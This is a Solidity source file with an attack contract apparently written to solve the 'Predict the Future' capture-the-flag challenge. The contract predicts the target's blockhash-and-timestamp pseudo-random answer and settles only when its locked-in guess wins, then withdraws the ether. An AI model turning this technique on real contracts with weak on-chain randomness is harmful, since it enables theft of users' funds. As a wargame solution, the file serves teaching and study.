// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IPredictTheFutureChallenge {
    function settle() external;
    function lockInGuess(uint8) external payable;
}


contract Exploit {
    IPredictTheFutureChallenge public PredictTheFutureChallenge;
    address public owner;
    uint8 public guess;
    event answerEqualsGuess(bool val);
    event calledContract(bool val);

    constructor(address _address) {
        require(_address != address(0), "Address cannot be empty!");
        PredictTheFutureChallenge = IPredictTheFutureChallenge(_address);
        owner = msg.sender;
    }

    modifier isOwner() {
        require(msg.sender == owner, "Only owner can interact with the function");
        _;
    }

    function lockInGuess(uint8 n) public payable isOwner {
        require(msg.value == 1 ether, "Msg value must be 1 ether");
        guess = n;
        PredictTheFutureChallenge.lockInGuess{value: 1 ether}(n);
    }

    function solve() public isOwner {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        if (answer == guess) {
            emit answerEqualsGuess(true);
            PredictTheFutureChallenge.settle();
            emit calledContract(true);
        } else {
            emit answerEqualsGuess(false);
        }
    }

    function fail() public isOwner {
        PredictTheFutureChallenge.settle();
        emit calledContract(true);
    }

    function withdraw() public isOwner {
        payable(owner).transfer(address(this).balance);
    }

    function checkBalance() public view returns(uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
